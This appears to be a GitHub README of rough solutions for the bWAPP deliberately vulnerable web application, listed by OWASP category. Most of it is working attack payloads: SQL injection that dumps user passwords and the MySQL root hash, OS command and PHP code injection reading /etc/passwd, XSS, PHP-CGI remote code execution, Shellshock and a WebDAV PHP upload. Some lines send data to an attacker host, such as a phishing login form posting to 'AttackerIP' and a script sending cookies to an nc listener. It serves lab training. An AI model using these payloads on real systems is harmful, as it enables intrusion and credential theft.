# solutions-bwapp
In progress rough solutions.  This is not a comprehensive solution list.  Updating whenever I have the time.

Ref sheet
http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

# Contributors
[@mmmds](https://github.com/mmmds)

# A1 - Injection

### HTML Injection - Reflected (GET)
htmli_get.php

```
/bWAPP/htmli_get.php?firstname=%3Ch1%3EHello%3C%2Fh1%3E&lastname=%3Ch2%3EWorld%3C%2Fh2%3E&form=submit
```
 
### HTML Injection - Reflected (POST)

```
<h1>Hello</h1>
<h2>World</h2>
```

### HTML Injection - Reflected (URL)

XXX:  Todo, IE only?
```
/bWAPP/htmli_current_url.php
```

### HTML Injection - Stored (Blog)

Following solution taken from:
```
http://penthusiasts.blogspot.com/2013/12/bwapp-html-injection-all.html
```
```
<div style="position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index: 1000; background-color:white; padding: 1em;">Please login with valid credentials:<br><form name="login" action="http://AttackerIP/login.htm"><table><tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td><td><input type="text" name="password"/></td></tr><tr><td colspan=2 align=center><input type="submit" value="Login"/></td></tr></table></form></div>
```

Attacker's machine:
```
nc -l 80
```

### iFrame Injection
```
ParamUrl=robots.txt" onload="alert(1)
ParamHeight="></iframe><script>alert(1);</script>
```

### OS Command Injection
```
www.nsa.gov; cat /etc/passwd
www.nsa.gov & cat /etc/passwd
www.nsa.gov | cat /etc/passwd
```

### OS Command Injection - Blind
```
www.nsa.gov | sleep 10
```

### PHP Code Injection

```
/bWAPP/phpi.php?message=a;echo "what"; $fp = fopen("/etc/passwd","r");$result = fread($fp,8192); echo $result
```
### Server-Side Includes:

```
<!--#echo var="DATE_LOCAL" -->
<!--#exec cmd="cat /etc/passwd" -->
```

### SQL Injection (GET/SEARCH)

```
a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null from information_schema.tables;--
```

### SQL Injection (GET/SELECT)

```
movie=1 UNION ALL SELECT table_schema, table_name, null, null, null, null, null FROM information_schema.tables LIMIT 1 OFFSET 1;--
```
![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/sqli_2_1.png)
![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/sqli_2_2.png)

### SQL Injection (POST/Search)
/bWAPP/sqli_6.php

```
a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null from information_schema.tables;-- 
```

### SQL Injection (POST/Select)

Use Burp
```
movie=1 UNION ALL SELECT table_schema, table_name, null, null, null, null, null FROM information_schema.tables LIMIT 1 OFFSET 1;--
```

### SQL Injection (AJAX/JSON/jQuery)
Use Burp 
```
a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null from information_schema.tables;--
```
![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/sqli_10_1.png)

a%' UNION ALL SELECT 1, column_name, null, null, null, null, null from information_schema.columns where table_name="users";-- 

blah%' union all select 1,login,password,email,secret,1, 1 from users --

### SQL Injection (Login Form/Hero)
```
ok' or 1=1-- 
```
### SQL Injection(SQLite)

```
a%' UNION ALL SELECT 1,sqlite_version(),1,1,1,1; --
```

### SQL Injection - Stored (Blog)

Be sure to add a space after the -- for this one, otherwise the injection will not work
```
asdf',(SELECT database()  ))-- 
```

To begin enumerating tables:
```
asdf',(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'bWAPP' LIMIT 0,1  ))-- 
asdf',(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'bWAPP' LIMIT 1,1  ))-- 
```

```
asdf',(select password from mysql.user where user='root' ))-- 
```

### XML/XPath Injection (Login Form)
```
password=' or id='2
```

### XML/XPath Injection (Search)
```
genre=')]/password | a[contains(a,'
genre=') or contains(genre, '
genre=') or not(contains(genre, 'xxx') and '1'='2
```

# A2 - Broken Authentication

### Broken Auth. - CAPTCHA Bypassing

Using Burp, do not allow the webpage to load captcha_box.php, this page loads the server's session variable $_SESSION["captcha"] which will then require a check on ba_captcha_bypass.php
The second requirement is to prevent captcha_user from being submitted by the client.  Eliminate this using Burp:


```
POST /bWAPP/ba_captcha_bypass.php HTTP/1.1
Host: bepp:8088
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://bepp:8088/bWAPP/ba_captcha_bypass.php
Cookie: PHPSESSID=67a6abb1d7ff40c55ad50d3aa43fc7c4; security_level=0
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

login=bee&password=bug&form=submit
```

### Broken Auth. - Logout Management
Open second tab and logout. Second tab will still have session.

### Session Mgmt. - Administrative Portals
In URL and Cookies
```
admin=1
```

# A3 - Cross-Site Scripting (XSS) 

### XSS - Reflected (GET)
xss_get.php

```
<script>alert(document.cookie)</script>
```

### XSS - Reflected (POST)

xss_post.php
```
<script>alert(document.cookie)</script>
```

### XSS - Reflected (JSON)

xss_json.php
```
"}]}';prompt(0)</script>
```

### XSS - Reflected (AJAX/JSON)

xss_ajax_2-1.php
```
<svg onload=prompt(0)>
```

### XSS - Reflected (AJAX/XML)
xss_ajax_1-1.php
```
&lt;img src=&apos;#&apos; onerror=&apos;alert(1)&apos;&gt;
```

Alternatively I was able to get XSS to execute on the AJAX called.
```
xss_ajax_1-2.php?title=<html xmlns='http://www.w3.org/1999/xhtml'><script>prompt(0)</script></html>
```

### XSS - Reflected (Back Button)
Modify Referer header field
```
Referer: ';alert(1);'
```

### XSS - Reflected (Custom Header)
Add header field
```
bWAPP: <script>alert(1)</script>
```

### XSS - Reflected (Eval)
```
date=alert(1)
```

### XSS - Reflected (HREF)
```
Referer: <script>alert(1)</script>
```

### XSS - Reflected (User-Agent)
```
User-Agent: <script>alert(1)</script>
```

# A4 - Insecure Direct Object References

### Insecure DOR (Change Secret)
Use Burp to unhide hidden fields or intercept POST param.  

### Insecure DOR (Reset Secret)
Change 'login' and 'secret' field to arbitrary values.
```
POST /bWAPP/xxe-2.php HTTP/1.1
Host: bepp:8088
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=UTF-8
Referer: http://bepp:8088/bWAPP/insecure_direct_object_ref_3.php
Content-Length: 59
Cookie: PHPSESSID=77aa634b546d1c78d5afc16aae328172; security_level=0
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

<reset><login>bee</login><secret>Any bugs?</secret></reset>
```

### Insecure DOR (Order Tickets)
bWAPP/insecure_direct_object_ref_2.php

Use Burp to unhide hidden ticket price field, or use proxy to modify the POST param while in transit.

# A5 - Security Misconfiguration

### Cross-Origin Resource Sharing (AJAX)
It's possible because of header in response:
```
Access-Control-Allow-Origin: *
```
```
<html>
    <head>
    <script>
        function steal() {
            var r = new XMLHttpRequest();
            r.onreadystatechange = function() {
                if (r.readyState == 4 && r.status == 200) {
                    alert(r.responseText);
                }
            };
            r.open("GET", "http://192.168.1.10/bWAPP/secret-cors-1.php", true);
            r.send();
        }
    </script>
    </head>
    <body onload="steal()">
    </body>
</html>
```

### Cross-Site Tracing (XST) 

Doesn't work on modern browsers as there are security enforcements.  Maybe use phantomJS?

I modified the POC to use GET instead of TRACE.  Additional changes from original xst.js include making the onreadystatechange NOT inline (seems to play better with FF).

1.  Start listener on attacking machine:  nc -l 8888

2.  Modify xst.js to match your environment:


```
var xmlhttp;	
// Code for IE7+, Firefox, Chrome, Opera, Safari
if (window.XMLHttpRequest)
{
	xmlhttp=new XMLHttpRequest();
}
// Code for IE6, IE5	
else
{ 
	xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}	

xmlhttp.onreadystatechange=foo;

function foo()
{	
	if (xmlhttp.readyState==4 && xmlhttp.status==200)
	{	
		xmlResp=xmlhttp.responseText;
		// document.getElementById("response").innerHTML=xmlResp
		alert(xmlResp);
		document.location="http://[attacker_ip]:8888/grab.cgi?"+document.cookie;
	}
}
// xmlhttp.open("TRACE","/bWAPP/",true);
xmlhttp.open("GET","/bWAPP/",true);
// xmlhttp.withCredentials = true;
xmlhttp.send();
```

### Insecure FTP Configuration

Anonymous login with write permissions are enabled
```
$ ftp 192.168.1.9
Connected to 192.168.1.9.
anonymous
220 ProFTPD 1.3.1 Server (bee-box) [192.168.1.9]
Name (192.168.1.9:dean): 331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||42936|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 root     www-data   543803 Nov  2  2014 Iron_Man.pdf
-rw-rw-r--   1 root     www-data   462949 Nov  2  2014 Terminator_Salvation.pdf
-rw-rw-r--   1 root     www-data   544600 Nov  2  2014 The_Amazing_Spider-Man.pdf
-rw-rw-r--   1 root     www-data   526187 Nov  2  2014 The_Cabin_in_the_Woods.pdf
-rw-rw-r--   1 root     www-data   756522 Nov  2  2014 The_Dark_Knight_Rises.pdf
-rw-rw-r--   1 root     www-data   618117 Nov  2  2014 The_Incredible_Hulk.pdf
-rw-rw-r--   1 root     www-data  5010042 Nov  2  2014 bWAPP_intro.pdf
226 Transfer complete
ftp> puts test.txt
?Invalid command.
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||28299|)
150 Opening BINARY mode data connection for test.txt
     0        0.00 KiB/s
226 Transfer complete
ftp> ^D
221 Goodbye.
```

### Insecure SNMP Configuration

Default community strings are set on the machine

```
$ snmpwalk -v2c -c private bwapp-server
$ snmpwalk -v2c -c public bwapp-server
```

### Insecure WebDAV Configuration
```
curl -X PUT --data '<?php $f=fopen("/etc/passwd","r"); echo fread($f,filesize("/etc/passwd")); fclose($f); ?>' 'http://192.168.1.10/webdav/attack.php'
```

# A6 - Sensitive Data Exposure 

### Base64 Encoding (Secret)

Use Burp to get cookie

![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/insecure_crypt_storage_3.png)

### Heartbleed Vulnerability

Use the heartbleed.py script found in the /evil directory

```
python heartbleed.py [ip] 
```



# A7 - Missing Functional Level Access Control

### Directory Traversal - Directories
directory_traversal_2.php
```
/bWAPP/directory_traversal_2.php?directory=../../../../home/
```

### Directory Traversal - Files
directory_traversal_1.php
```
/bWAPP/directory_traversal_1.php?page=../../../../../etc/passwd
```

### Host Header Attack (Cache Poisoning)
hostheader_1.php

![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/hostheader_1_1.png)

### Host Header Attack (Reset Poisoning)
hostheader_2.php

![]()

### Remote & Local File Inclusion (RFI/LFI)

Copy rfi.txt to rfi.php, it appears PHP automatically adds the suffix .php. 
```
bWAPP/rlfi.php?language=../evil/rfi
```

### Restrict Device Access
Modify request
```
User-Agent: Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19 
```

# A8 - Cross-Site Request Forgery (CSRF)

Reference the HTML files in resources directory.  You can modify these to auto execute in a hidden iframe as an exercise.  If bWAPP had CSRF mitigations (such as utilization of tokens), then the POST requests made from the csrf_x.html files would respond with forbidden.

### Cross-Site Request Forgery (Change Password)
Please reference [csrf_1.html](resources/csrf_1.html).  Replace the address within the HTML with your own bWAPP server and run the form to change the password.  If CSRF tokens were utilized, then the server should return forbidden.  

### Cross-Site Request Forgery (Change Secret)
Please references [csrf_2.html](resources/csrf_2.html).  Again, replace the address within the HTML with your own bWAPP server to change the secret.

### Cross-Site Request Forgery (Transfer Amount)
Please references [csrf_3.html](resources/csrf_3.html).  Again, replace the address within the HTML with your own bWAPP server to change the secret.

# A9 - Using Known Vulnerable Components

### PHP CGI Remote Code Execution
```
POST /bWAPP/admin/phpinfo.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
Host: 192.168.1.20
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Length: 70
Cookie: security_level=0; PHPSESSID=e27e4148fbb0b82028e1cd6e159f4e7a
Connection: close

<?php $r; exec('cat /etc/passwd', $r); echo implode($r, "\n"); die; ?>
```

There is also possibility to display source code
```
http://192.168.1.20/bWAPP/admin/phpinfo.php?-s
```

### Shellshock Vulnerability (CGI)
Modify /bWAPP/cgi-bin/shellshock.sh request
```
Referer: () { nothing;}; /bin/touch /tmp/malicious
```
```
Referer: () { nothing;}; echo; /bin/cat /etc/passwd
```

# Other bugs...

### HTTP Paramter Pollution
Put name
```
bee&movie=1
```
then every link will choose G.I Joe: Retaliation movie.

### HTTP Response Splitting
```
http://192.168.1.20/bWAPP/http_response_splitting.php?url=http://itsecgames.blogspot.com%0AReferer%3agoogle.com
```
